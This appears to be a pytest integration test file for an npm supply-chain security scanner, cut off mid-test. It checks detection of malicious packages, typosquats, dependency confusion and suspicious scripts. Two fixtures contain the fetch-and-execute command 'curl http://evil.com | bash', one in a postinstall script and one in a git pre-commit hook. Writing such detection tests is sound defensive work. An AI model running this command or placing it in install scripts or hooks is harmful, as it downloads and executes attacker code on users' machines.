"""Integration tests for npm_shield/scanner.py.

Tests use a synthetic fake node_modules tree built in temporary directories.
No real npm registry or network calls are made (OSV queries are mocked).

Test classes:
- TestScannerInit: Initialisation and validation.
- TestScannerRunBasic: Core run() / run_full() behaviour.
- TestScannerWithNodeModules: Scanning a real-ish node_modules tree.
- TestScannerFindings: Verify specific findings are raised.
- TestScannerOSVEnrichment: OSV integration (mocked).
- TestScannerSeverityFilter: min_severity filtering.
- TestScannerDeduplication: Duplicate finding removal.
- TestScanResult: ScanResult data model tests.
- TestScanProjectConvenience: scan_project() convenience function.
- TestScannerSyntheticPackages: Scanning without node_modules present.
- TestScannerErrorHandling: Non-fatal error collection.
"""

from __future__ import annotations

import json
import stat
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import pytest

from npm_shield.scanner import ScanResult, Scanner, scan_project


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _write_json(path: Path, data: dict) -> None:
    """Write a dictionary as JSON to a file."""
    path.write_text(json.dumps(data), encoding="utf-8")


def _make_project(
    tmp_path: Path,
    pkg_data: dict | None = None,
) -> Path:
    """Create a minimal Node.js project directory with package.json."""
    project = tmp_path / "project"
    project.mkdir(exist_ok=True)
    data = pkg_data or {"name": "test-project", "version": "1.0.0"}
    _write_json(project / "package.json", data)
    return project


def _make_package(
    node_modules: Path,
    name: str,
    version: str = "1.0.0",
    scripts: dict[str, str] | None = None,
    extra: dict[str, Any] | None = None,
) -> Path:
    """Create a package inside node_modules with a valid package.json."""
    if name.startswith("@"):
        scope, pkg_name = name.lstrip("@").split("/", 1)
        pkg_dir = node_modules / f"@{scope}" / pkg_name
    else:
        pkg_dir = node_modules / name
    pkg_dir.mkdir(parents=True, exist_ok=True)
    data: dict[str, Any] = {"name": name, "version": version}
    if scripts:
        data["scripts"] = scripts
    if extra:
        data.update(extra)
    _write_json(pkg_dir / "package.json", data)
    return pkg_dir


def _make_git_hooks(project: Path) -> Path:
    """Create a .git/hooks directory inside the project."""
    hooks_dir = project / ".git" / "hooks"
    hooks_dir.mkdir(parents=True, exist_ok=True)
    return hooks_dir


# ---------------------------------------------------------------------------
# TestScannerInit
# ---------------------------------------------------------------------------


class TestScannerInit:
    """Tests for Scanner.__init__ validation."""

    def test_raises_on_missing_path(self, tmp_path: Path) -> None:
        with pytest.raises(FileNotFoundError):
            Scanner(project_path=tmp_path / "nonexistent")

    def test_raises_on_file_path(self, tmp_path: Path) -> None:
        f = tmp_path / "file.json"
        f.write_text("{}", encoding="utf-8")
        with pytest.raises(ValueError):
            Scanner(project_path=f)

    def test_raises_on_missing_package_json(self, tmp_path: Path) -> None:
        empty_dir = tmp_path / "empty"
        empty_dir.mkdir()
        with pytest.raises(FileNotFoundError, match="package.json"):
            Scanner(project_path=empty_dir)

    def test_valid_project_creates_scanner(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        scanner = Scanner(project_path=project)
        assert scanner.project_path == project.resolve()

    def test_min_severity_stored_lowercase(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        scanner = Scanner(project_path=project, min_severity="HIGH")
        assert scanner.min_severity == "high"

    def test_min_severity_default_is_info(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        scanner = Scanner(project_path=project)
        assert scanner.min_severity == "info"

    def test_osv_flag_stored(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        scanner = Scanner(project_path=project, enable_osv=True)
        assert scanner.enable_osv is True

    def test_osv_flag_default_false(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        scanner = Scanner(project_path=project)
        assert scanner.enable_osv is False

    def test_credential_scan_flag_stored(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        scanner = Scanner(project_path=project, enable_credential_scan=False)
        assert scanner.enable_credential_scan is False

    def test_credential_scan_default_true(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        scanner = Scanner(project_path=project)
        assert scanner.enable_credential_scan is True

    def test_project_path_resolved_to_absolute(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        scanner = Scanner(project_path=project)
        assert scanner.project_path.is_absolute()

    def test_accepts_path_with_trailing_slash(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        # Append separator to path string to get a trailing slash variant
        project_with_slash = Path(str(project) + "/")
        # Should not raise
        scanner = Scanner(project_path=project_with_slash)
        assert scanner.project_path.is_absolute()


# ---------------------------------------------------------------------------
# TestScannerRunBasic
# ---------------------------------------------------------------------------


class TestScannerRunBasic:
    """Tests for Scanner.run() and Scanner.run_full() basic behaviour."""

    def test_run_returns_list(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        scanner = Scanner(project_path=project)
        result = scanner.run()
        assert isinstance(result, list)

    def test_run_full_returns_scan_result(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        scanner = Scanner(project_path=project)
        result = scanner.run_full()
        assert isinstance(result, ScanResult)

    def test_scan_result_project_name(self, tmp_path: Path) -> None:
        project = _make_project(
            tmp_path, {"name": "my-app", "version": "2.0.0"}
        )
        scanner = Scanner(project_path=project)
        result = scanner.run_full()
        assert result.project_name == "my-app"
        assert result.project_version == "2.0.0"

    def test_scan_result_has_scanned_at(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        result = Scanner(project_path=project).run_full()
        assert isinstance(result.scanned_at, str)
        assert len(result.scanned_at) > 0

    def test_scan_result_scanned_at_is_iso_format(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        result = Scanner(project_path=project).run_full()
        # ISO 8601 timestamps contain 'T' separator
        assert "T" in result.scanned_at or "-" in result.scanned_at

    def test_scan_result_has_duration(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        result = Scanner(project_path=project).run_full()
        assert isinstance(result.duration_seconds, float)
        assert result.duration_seconds >= 0.0

    def test_scan_result_duration_is_positive(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        result = Scanner(project_path=project).run_full()
        # Scan should take at least some time
        assert result.duration_seconds >= 0.0

    def test_clean_project_has_no_findings(self, tmp_path: Path) -> None:
        project = _make_project(
            tmp_path,
            {
                "name": "clean-app",
                "version": "1.0.0",
                "dependencies": {"lodash": "^4.17.21"},
            },
        )
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lodash", "4.17.21")

        scanner = Scanner(
            project_path=project, enable_credential_scan=False
        )
        result = scanner.run_full()
        assert result.finding_count == 0
        assert result.errors == []

    def test_no_node_modules_uses_declared_deps(self, tmp_path: Path) -> None:
        project = _make_project(
            tmp_path,
            {
                "name": "my-app",
                "version": "1.0.0",
                "dependencies": {"crossenv": "^1.0.0"},
            },
        )
        # No node_modules directory — should use declared deps as synthetic packages
        scanner = Scanner(
            project_path=project, enable_credential_scan=False
        )
        result = scanner.run_full()
        # crossenv should be flagged from declared dependencies
        malicious = [
            f for f in result.findings if f["detector"] == "known-malicious"
        ]
        assert len(malicious) >= 1

    def test_has_lockfile_detected(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        _write_json(
            project / "package-lock.json",
            {"lockfileVersion": 2, "dependencies": {}},
        )
        result = Scanner(project_path=project).run_full()
        assert result.has_lockfile is True

    def test_no_lockfile_detected(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        assert result.has_lockfile is False

    def test_packages_analysed_count(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lodash", "4.17.21")
        _make_package(nm, "express", "4.18.2")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        assert result.packages_analysed == 2

    def test_has_node_modules_flag(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        assert result.has_node_modules is True

    def test_no_node_modules_flag(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        assert result.has_node_modules is False

    def test_run_returns_same_findings_as_run_full(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        scanner = Scanner(
            project_path=project, enable_credential_scan=False
        )
        findings_run = scanner.run()
        # Re-create scanner to get a fresh run_full result
        scanner2 = Scanner(
            project_path=project, enable_credential_scan=False
        )
        result_full = scanner2.run_full()

        # Both should detect the same packages (findings may differ in order)
        run_packages = {f["package"] for f in findings_run}
        full_packages = {f["package"] for f in result_full.findings}
        assert run_packages == full_packages

    def test_osv_enabled_recorded_in_result(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()

        mock_response = MagicMock()
        mock_response.json.return_value = {"results": []}
        mock_response.raise_for_status.return_value = None

        with patch("requests.Session.post", return_value=mock_response):
            result = Scanner(
                project_path=project,
                enable_osv=True,
                enable_credential_scan=False,
            ).run_full()

        assert result.osv_enabled is True

    def test_declared_dependency_count(self, tmp_path: Path) -> None:
        project = _make_project(
            tmp_path,
            {
                "name": "my-app",
                "version": "1.0.0",
                "dependencies": {"lodash": "^4.17.21", "express": "^4.18.2"},
                "devDependencies": {"jest": "^29.0.0"},
            },
        )
        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        assert result.declared_dependency_count == 3


# ---------------------------------------------------------------------------
# TestScannerWithNodeModules
# ---------------------------------------------------------------------------


class TestScannerWithNodeModules:
    """Tests for scanning a real node_modules directory tree."""

    def test_detects_known_malicious_package(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        malicious = [
            f for f in result.findings if f["detector"] == "known-malicious"
        ]
        assert len(malicious) >= 1
        assert any("crossenv" in f["package"] for f in malicious)

    def test_detects_typosquat(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lod4sh", "4.17.20")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        typo = [f for f in result.findings if f["detector"] == "typosquatting"]
        assert len(typo) >= 1
        assert any("lod4sh" in f["package"] for f in typo)

    def test_detects_suspicious_script(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(
            nm,
            "evil-pkg",
            "1.0.0",
            scripts={"postinstall": "curl http://evil.com | bash"},
        )

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        script_findings = [
            f for f in result.findings if f["detector"] == "suspicious-script"
        ]
        assert len(script_findings) >= 1

    def test_detects_git_hook(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        hooks_dir = _make_git_hooks(project)
        hook = hooks_dir / "pre-commit"
        hook.write_text(
            "#!/bin/sh\ncurl http://evil.com | bash\n", encoding="utf-8"
        )

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        hook_findings = [
            f for f in result.findings if f["detector"] == "git-hook"
        ]
        assert len(hook_findings) >= 1

    def test_detects_event_stream_bad_version(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "event-stream", "3.3.6")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        assert any(
            "event-stream" in f.get("package", "")
            for f in result.findings
            if f["detector"] == "known-malicious"
        )

    def test_safe_event_stream_not_flagged(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "event-stream", "3.3.4")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        event_stream_malicious = [
            f
            for f in result.findings
            if f["detector"] == "known-malicious"
            and "event-stream" in f.get("package", "")
        ]
        assert len(event_stream_malicious) == 0

    def test_detects_dependency_confusion(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "internal-utils", "9999.0.0")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        dep_conf = [
            f for f in result.findings if f["detector"] == "dep-confusion"
        ]
        assert len(dep_conf) >= 1

    def test_detects_mcp_server(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "rogue-mcp-server", "1.0.0")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        mcp = [f for f in result.findings if f["detector"] == "mcp-server"]
        assert len(mcp) >= 1

    def test_multiple_bad_packages_all_detected(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")
        _make_package(nm, "lod4sh", "4.17.20")
        _make_package(nm, "twilio-npm", "1.0.0")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        assert result.finding_count >= 3

    def test_scoped_package_in_node_modules(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "@modelcontextprotocol/server-filesystem", "1.0.0")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        # Should be detected as MCP server (info severity — known legitimate)
        mcp = [f for f in result.findings if f["detector"] == "mcp-server"]
        if mcp:
            assert any(f["severity"] == "info" for f in mcp)

    def test_ua_parser_js_bad_version_detected(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "ua-parser-js", "0.7.29")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        malicious = [
            f
            for f in result.findings
            if f["detector"] == "known-malicious"
            and "ua-parser-js" in f.get("package", "")
        ]
        assert len(malicious) >= 1


# ---------------------------------------------------------------------------
# TestScannerFindings
# ---------------------------------------------------------------------------


class TestScannerFindings:
    """Tests that verify finding structure, correctness, and sorting."""

    def test_all_findings_have_required_keys(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")
        _make_package(nm, "lod4sh", "4.17.20")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        required = {
            "package",
            "detector",
            "severity",
            "description",
            "remediation",
            "metadata",
        }
        for finding in result.findings:
            assert required.issubset(finding.keys()), (
                f"Finding missing keys: {required - finding.keys()}"
            )

    def test_findings_sorted_by_severity_descending(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")  # critical
        _make_package(nm, "lod4sh", "4.17.20")   # high (typosquat)

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()

        from npm_shield.patterns import SEVERITY_RANK

        ranks = [
            SEVERITY_RANK.get(f["severity"].lower(), 0)
            for f in result.findings
        ]
        assert ranks == sorted(ranks, reverse=True), (
            f"Findings not sorted by descending severity. Ranks: {ranks}"
        )

    def test_no_duplicate_findings(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()

        # Check for duplicates using the same key logic as the scanner
        keys = [
            (
                f.get("package", ""),
                f.get("detector", ""),
                f.get("description", "")[:120],
            )
            for f in result.findings
        ]
        assert len(keys) == len(set(keys)), "Duplicate findings detected"

    def test_findings_severities_are_valid(self, tmp_path: Path) -> None:
        valid_severities = {"info", "low", "medium", "high", "critical"}
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")
        _make_package(nm, "lod4sh", "4.17.20")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        for f in result.findings:
            assert f["severity"] in valid_severities, (
                f"Invalid severity: {f['severity']}"
            )

    def test_findings_detectors_are_valid_strings(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        valid_detectors = {
            "known-malicious",
            "typosquatting",
            "suspicious-script",
            "git-hook",
            "credential-harvesting",
            "mcp-server",
            "rogue-binary",
            "dep-confusion",
            "osv-vulnerability",
        }
        for f in result.findings:
            assert f["detector"] in valid_detectors, (
                f"Unknown detector: {f['detector']}"
            )

    def test_finding_descriptions_are_non_empty(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        for f in result.findings:
            assert isinstance(f["description"], str)
            assert len(f["description"].strip()) > 0

    def test_finding_remediations_are_non_empty(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        for f in result.findings:
            assert isinstance(f["remediation"], str)
            assert len(f["remediation"].strip()) > 0

    def test_finding_metadata_is_dict(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        for f in result.findings:
            assert isinstance(f["metadata"], dict)


# ---------------------------------------------------------------------------
# TestScannerOSVEnrichment
# ---------------------------------------------------------------------------


class TestScannerOSVEnrichment:
    """Tests for OSV.dev vulnerability enrichment (network mocked)."""

    def _mock_batch_response_with_vuln(self) -> dict:
        """Build a sample OSV batch response with one vulnerability."""
        return {
            "results": [
                {
                    "vulns": [
                        {
                            "id": "GHSA-test-0001",
                            "summary": "Test vulnerability in lodash",
                            "details": "A test vulnerability for unit testing.",
                            "aliases": ["CVE-2024-99999"],
                            "database_specific": {"severity": "HIGH"},
                            "affected": [
                                {
                                    "package": {
                                        "name": "lodash",
                                        "ecosystem": "npm",
                                    },
                                    "versions": ["4.17.20"],
                                    "ranges": [
                                        {
                                            "type": "SEMVER",
                                            "events": [
                                                {"introduced": "4.0.0"},
                                                {"fixed": "4.17.21"},
                                            ],
                                        }
                                    ],
                                }
                            ],
                            "references": [
                                {
                                    "url": "https://github.com/advisories/GHSA-test-0001"
                                }
                            ],
                        }
                    ]
                }
            ]
        }

    def test_osv_findings_added_when_enabled(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lodash", "4.17.20")

        mock_response = MagicMock()
        mock_response.json.return_value = self._mock_batch_response_with_vuln()
        mock_response.raise_for_status.return_value = None

        with patch("requests.Session.post", return_value=mock_response):
            result = Scanner(
                project_path=project,
                enable_osv=True,
                enable_credential_scan=False,
            ).run_full()

        osv_findings = [
            f for f in result.findings if f["detector"] == "osv-vulnerability"
        ]
        assert len(osv_findings) >= 1
        assert result.osv_enabled is True

    def test_osv_finding_structure(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lodash", "4.17.20")

        mock_response = MagicMock()
        mock_response.json.return_value = self._mock_batch_response_with_vuln()
        mock_response.raise_for_status.return_value = None

        with patch("requests.Session.post", return_value=mock_response):
            result = Scanner(
                project_path=project,
                enable_osv=True,
                enable_credential_scan=False,
            ).run_full()

        osv_findings = [
            f for f in result.findings if f["detector"] == "osv-vulnerability"
        ]
        if osv_findings:
            f = osv_findings[0]
            assert "osv_id" in f["metadata"]
            assert f["metadata"]["osv_id"] == "GHSA-test-0001"
            assert f["severity"] == "high"

    def test_osv_not_queried_when_disabled(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lodash", "4.17.20")

        with patch("requests.Session.post") as mock_post:
            result = Scanner(
                project_path=project,
                enable_osv=False,
                enable_credential_scan=False,
            ).run_full()

        # POST should not have been called for OSV
        assert not mock_post.called
        osv_findings = [
            f for f in result.findings if f["detector"] == "osv-vulnerability"
        ]
        assert len(osv_findings) == 0

    def test_osv_graceful_on_network_error(self, tmp_path: Path) -> None:
        import requests as req_lib

        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lodash", "4.17.20")

        with patch(
            "requests.Session.post",
            side_effect=req_lib.exceptions.ConnectionError(),
        ):
            result = Scanner(
                project_path=project,
                enable_osv=True,
                enable_credential_scan=False,
            ).run_full()

        # Should not crash; OSV findings will simply be absent
        assert isinstance(result, ScanResult)
        assert result.osv_enabled is True

    def test_osv_graceful_on_timeout(self, tmp_path: Path) -> None:
        import requests as req_lib

        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lodash", "4.17.20")

        with patch(
            "requests.Session.post",
            side_effect=req_lib.exceptions.Timeout(),
        ):
            result = Scanner(
                project_path=project,
                enable_osv=True,
                enable_credential_scan=False,
            ).run_full()

        assert isinstance(result, ScanResult)

    def test_osv_empty_response_is_handled(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lodash", "4.17.20")

        mock_response = MagicMock()
        mock_response.json.return_value = {"results": [{"vulns": []}]}
        mock_response.raise_for_status.return_value = None

        with patch("requests.Session.post", return_value=mock_response):
            result = Scanner(
                project_path=project,
                enable_osv=True,
                enable_credential_scan=False,
            ).run_full()

        osv_findings = [
            f for f in result.findings if f["detector"] == "osv-vulnerability"
        ]
        assert len(osv_findings) == 0

    def test_osv_not_queried_when_no_packages(self, tmp_path: Path) -> None:
        """When no packages installed and no declared deps, OSV should not be called."""
        project = _make_project(tmp_path)
        # No node_modules, no declared deps

        with patch("requests.Session.post") as mock_post:
            Scanner(
                project_path=project,
                enable_osv=True,
                enable_credential_scan=False,
            ).run_full()

        # With no packages to query, post may or may not be called;
        # what matters is no crash occurred.
        assert True  # Reached without exception


# ---------------------------------------------------------------------------
# TestScannerSeverityFilter
# ---------------------------------------------------------------------------


class TestScannerSeverityFilter:
    """Tests for minimum severity filtering."""

    def test_min_severity_high_filters_lower(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")  # critical
        _make_package(nm, "lod4sh", "4.17.20")   # high (typosquat)

        result = Scanner(
            project_path=project,
            enable_credential_scan=False,
            min_severity="high",
        ).run_full()

        from npm_shield.patterns import SEVERITY_RANK

        for f in result.findings:
            rank = SEVERITY_RANK.get(f["severity"].lower(), 0)
            assert rank >= SEVERITY_RANK["high"], (
                f"Finding below min_severity: {f['severity']} — {f['package']}"
            )

    def test_min_severity_info_includes_all(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        result = Scanner(
            project_path=project,
            enable_credential_scan=False,
            min_severity="info",
        ).run_full()
        # All findings should pass through (info is lowest)
        assert result.finding_count >= 1

    def test_min_severity_critical_only(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")  # critical
        _make_package(nm, "lod4sh", "4.17.20")  # high (filtered out)

        result = Scanner(
            project_path=project,
            enable_credential_scan=False,
            min_severity="critical",
        ).run_full()

        for f in result.findings:
            assert f["severity"] == "critical", (
                f"Non-critical finding passed through: {f}"
            )

    def test_min_severity_medium_filters_low_and_info(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        result = Scanner(
            project_path=project,
            enable_credential_scan=False,
            min_severity="medium",
        ).run_full()

        from npm_shield.patterns import SEVERITY_RANK

        for f in result.findings:
            rank = SEVERITY_RANK.get(f["severity"].lower(), 0)
            assert rank >= SEVERITY_RANK["medium"]

    def test_very_high_min_severity_with_no_findings(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "lod4sh", "4.17.20")  # high only

        result = Scanner(
            project_path=project,
            enable_credential_scan=False,
            min_severity="critical",
        ).run_full()

        # lod4sh is high, not critical — should be filtered
        assert result.finding_count == 0


# ---------------------------------------------------------------------------
# TestScannerDeduplication
# ---------------------------------------------------------------------------


class TestScannerDeduplication:
    """Tests for duplicate finding removal."""

    def test_no_duplicates_in_results(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")
        _make_package(nm, "event-stream", "3.3.6")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()

        keys = [
            (
                f.get("package", ""),
                f.get("detector", ""),
                f.get("description", "")[:120],
            )
            for f in result.findings
        ]
        assert len(keys) == len(set(keys)), "Duplicate findings found"

    def test_multiple_identical_installs_deduplicated(self, tmp_path: Path) -> None:
        """Even if the same package appears multiple times, deduplicate."""
        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()

        crossenv_malicious = [
            f
            for f in result.findings
            if f["detector"] == "known-malicious"
            and f["package"] == "crossenv"
        ]
        # Should only appear once
        assert len(crossenv_malicious) == 1


# ---------------------------------------------------------------------------
# TestScanResult
# ---------------------------------------------------------------------------


class TestScanResult:
    """Unit tests for the ScanResult data model."""

    def _make_result(
        self, findings: list[dict], project_path: Path | None = None
    ) -> ScanResult:
        result = ScanResult(
            project_path=project_path or Path("/fake/project")
        )
        result.findings = findings
        return result

    def test_finding_count_correct(self) -> None:
        result = self._make_result(
            [{"severity": "high"}, {"severity": "critical"}]
        )
        assert result.finding_count == 2

    def test_finding_count_zero_when_empty(self) -> None:
        result = self._make_result([])
        assert result.finding_count == 0

    def test_max_severity_critical(self) -> None:
        result = self._make_result(
            [
                {"severity": "high"},
                {"severity": "critical"},
                {"severity": "medium"},
            ]
        )
        assert result.max_severity == "critical"

    def test_max_severity_no_findings(self) -> None:
        result = self._make_result([])
        assert result.max_severity == "info"

    def test_max_severity_single_finding(self) -> None:
        result = self._make_result([{"severity": "medium"}])
        assert result.max_severity == "medium"

    def test_findings_by_severity_grouping(self) -> None:
        result = self._make_result(
            [
                {"severity": "high", "package": "a"},
                {"severity": "high", "package": "b"},
                {"severity": "critical", "package": "c"},
                {"severity": "info", "package": "d"},
            ]
        )
        by_sev = result.findings_by_severity
        assert len(by_sev["high"]) == 2
        assert len(by_sev["critical"]) == 1
        assert len(by_sev["info"]) == 1
        assert len(by_sev["medium"]) == 0
        assert len(by_sev["low"]) == 0

    def test_findings_by_severity_all_levels_present(self) -> None:
        result = self._make_result([])
        by_sev = result.findings_by_severity
        for level in ("critical", "high", "medium", "low", "info"):
            assert level in by_sev

    def test_to_dict_contains_required_keys(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        d = result.to_dict()
        required = {
            "project_path",
            "project_name",
            "project_version",
            "scanned_at",
            "duration_seconds",
            "packages_analysed",
            "finding_count",
            "max_severity",
            "severity_summary",
            "findings",
            "errors",
            "osv_enabled",
        }
        assert required.issubset(d.keys())

    def test_to_dict_severity_summary_has_all_levels(self, tmp_path: Path) -> None:
        project = _make_project(tmp_path)
        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        d = result.to_dict()
        for level in ("critical", "high", "medium", "low", "info"):
            assert level in d["severity_summary"]

    def test_to_dict_is_json_serialisable(self, tmp_path: Path) -> None:
        import json as _json

        project = _make_project(tmp_path)
        nm = project / "node_modules"
        nm.mkdir()
        _make_package(nm, "crossenv", "1.0.0")

        result = Scanner(
            project_path=project, enable_credential_scan=False
        ).run_full()
        # Should not raise
        serialised = _json.dumps(result.to_dict(), default=str)
        assert len(serialised) > 0

    def test_to_dict_findings_list_matches(self) -> None:
        findings = [
            {
                "package": "crossenv",
                "detector": "known-malicious",
                "severity": "critical",
                "description": "Test.",
                "remediation": "Fix it.",
                "metadata": {},
            }
        ]
        result = self._make_result(findings)
        d = result.to_dict()
        assert d["findings"] == findings
        assert d["finding_count"] == 1

    def test_to_dict_project_path_is_string(self) -> None:
        result = self._make_result([])
        d = result.to_dict()
        assert isinstance(d["project_path"], str)

    def test_to_dict_duration_rounded(self) -> None:
        result = self._make_result([])
        result.duration_seconds = 1.23456789
        d = result.to_dict()
        assert d["duration_seconds"] == round(1.23456789, 3)

    def test_errors_list_in_result(self) -> None:
        result = self._make_result([])
        result.errors = ["Something failed"]
        d = result.to_dict()
        assert d["errors"] == ["Something failed"]

    def test_default_errors_is_empty_list(self) -> None:
        result = self._make_result([])
        assert result.errors == []

    def test_scan_result_project_path_stored(self) -> None:
        path = Path("/some/project")
        result = ScanResult(project_path=path)
        assert result.project_path == path


# ---------------------------------------------------------------------------
# TestScannerSyntheticPackages
# ---------------------------------------------------------------------------


class TestScannerSyntheticPackages:
    """Tests for scanning when node_modules is absent (synthetic packages)."""

    def test_detects_malicious_declared_dependency(self, tmp_path: Path) -> None:
        project = _make_project(
            tmp_path,
            {
                "name": "my-app",
                "version": "1.0.0",
                "dependencies": {
